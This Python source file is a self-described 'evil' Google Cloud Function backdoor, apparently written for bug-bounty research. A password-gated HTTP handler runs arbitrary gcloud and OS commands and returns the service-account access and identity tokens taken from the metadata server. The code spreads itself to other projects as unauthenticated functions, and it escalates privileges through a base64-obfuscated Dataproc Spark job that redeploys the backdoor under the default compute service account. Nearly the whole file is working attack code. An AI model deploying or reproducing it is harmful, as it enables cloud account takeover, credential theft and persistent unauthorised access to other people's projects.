import subprocess
import random
import io
import string
import json
import os
from urllib.request import Request, urlopen
from base64 import b64decode, b64encode

def run_gcloud_command_local(command):
    if command.split(" ")[0] != "gcloud":
        command = "gcloud " + command
    print("Running command:")
    print(command)
    try:
        cmd_output = subprocess.check_output(command.split(" "), stderr=subprocess.STDOUT)
        return cmd_output.decode("utf-8").rstrip()
    except subprocess.CalledProcessError as E:
        print("error code", E, E.output)
        return False

def run_os_command_local(command):
    return os.system(command)

def drop_cf(latest_cf):
    if not os.path.exists("/tmp/base_cloud_function"):
        os.mkdir("/tmp/base_cloud_function")
    with open("/tmp/base_cloud_function/main.py", "w+") as f:
        f.write(latest_cf)

def random_name(stringLength=8):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(stringLength))


def dataproc_privesc(dest_proj, latest_cf, func_details):
    cluster_name = random_name()
    run_gcloud_command_local("gcloud dataproc clusters create {} --region us-central1 --scopes cloud-platform --metadata cf_name={},evilpassword={}".format(cluster_name, func_details["name"], func_details["evil_password"]))

    spark_string = "import subprocess\n\nimport os\n\nos.system(\"mkdir /tmp/base_cloud_function && echo \\\""
    spark_string += b64encode(latest_cf.encode("utf-8")).decode("utf-8")
    spark_string += "\\\" | base64 -d > /tmp/base_cloud_function/main.py\")"

    bash_string = """#!/bin/bash
PROJECT=$(gcloud config get-value project)
PROJECT_NUMBER=$(gcloud projects list --filter="$PROJECT" --format="value(PROJECT_NUMBER)")
DEST_SA="$PROJECT_NUMBER-compute@developer.gserviceaccount.com"
INSTANCE_ID=$(curl http://metadata.google.internal/computeMetadata/v1/instance/id -H "Metadata-Flavor: Google")
ZONE=$(curl http://metadata.google.internal/computeMetadata/v1/instance/zone -H "Metadata-Flavor: Google")
CF_NAME=$(gcloud compute instances describe $INSTANCE_ID --zone $ZONE --format='value[](metadata.items.cf_name)')
CF_PASSWORD=$(gcloud compute instances describe $INSTANCE_ID --zone $ZONE --format='value[](metadata.items.evilpassword)')
gcloud services enable cloudfunctions.googleapis.com
gcloud functions deploy $CF_NAME --set-env-vars=EVIL_PASSWORD=$CF_PASSWORD --timeout 300 --trigger-http --allow-unauthenticated --source /tmp/base_cloud_function --runtime python37 --entry-point hello_world --service-account $DEST_SA"""
    spark_string += "\n\nos.system(\"/bin/bash -c \\\"base64 -d <<< "
    spark_string += b64encode(bash_string.encode("utf-8")).decode("utf-8")
    spark_string += " | /bin/bash\\\"\")"
    print(spark_string)
    with open("/tmp/sparkjob.py", "w+") as f:
        f.write(spark_string)
    run_gcloud_command_local("gcloud dataproc jobs submit pyspark --cluster {} /tmp/sparkjob.py --region us-central1".format(cluster_name))
    run_gcloud_command_local("gcloud dataproc clusters delete {} --region us-central1 --quiet".format(cluster_name))


def create_gcf_in_another_project(dest_project, dest_sa, latest_cf, function_props):
    drop_cf(latest_cf)
    run_gcloud_command_local("gcloud config set project {}".format(dest_project))
    run_gcloud_command_local("gcloud services enable cloudfunctions.googleapis.com")
    succeeded = run_gcloud_command_local("gcloud functions deploy {} --set-env-vars=EVIL_PASSWORD={} --timeout 300 --trigger-http --allow-unauthenticated --source /tmp/base_cloud_function --runtime python37 --entry-point hello_world --service-account {}".format(function_props["name"], function_props["evil_password"], dest_sa))
    print("~~~~~~~~~~ {} ~~~~~~~~~~".format(succeeded))
    if not succeeded and succeeded != "0" and succeeded != 0:
        print("gcf provisioning failed")
        return False
    return function_props




def hello_world(request):
    """Responds to any HTTP request.
    Args:
        request (flask.Request): HTTP request object.
    Returns:
        The response text or any set of values that can be turned into a
        Response object using
        `make_response <http://flask.pocoo.org/docs/1.0/api/#flask.Flask.make_response>`.
    """
    request_json = request.get_json()
    if request_json and 'password' in request_json and request_json["password"] == os.environ["EVIL_PASSWORD"]:
        if "gcloud_command" in request_json:
            output = subprocess.check_output(request_json["gcloud_command"].split(" "))
            return output
        elif "get_token" in request_json:
            req = Request('http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token')
            req.add_header('Metadata-Flavor', 'Google')
            content = urlopen(req).read()
            token = json.loads(content)
            req = Request('http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity?audience=32555940559.apps.googleusercontent.com')
            req.add_header('Metadata-Flavor', 'Google')
            content = urlopen(req).read()
            token["identity"] = content.decode("utf-8")
            return json.dumps(token)
        elif "os_command" in request_json:
            os.system(request_json["os_command"])
        elif "privesc" in request_json:
            function_props = {"name": request_json["privesc"]["new_func_name"], "evil_password": request_json["privesc"]["new_func_password"]}
            return create_gcf_in_another_project(request_json["privesc"]["dest_project"], request_json["privesc"]["dest_sa"], request_json["privesc"]["latest_cf"], function_props)
        elif "dataproc" in request_json:
            function_props = {"name": request_json["dataproc"]["new_func_name"], "evil_password": request_json["dataproc"]["new_func_password"]}
            return dataproc_privesc(request_json["dataproc"]["dest_project"], request_json["privesc"]["latest_cf"], function_props)

        return "Did the evil"
    else:
        return "you're not evil enough to use this evil cloud function"

if __name__ == "__main__":
    module = __import__(__name__)
    with open(module.__file__) as f:
        current_cf = f.read()
    dataproc_privesc("bugbountyshinanigans", current_cf, {"evil_password": "potato", "name": "dataproctest"})


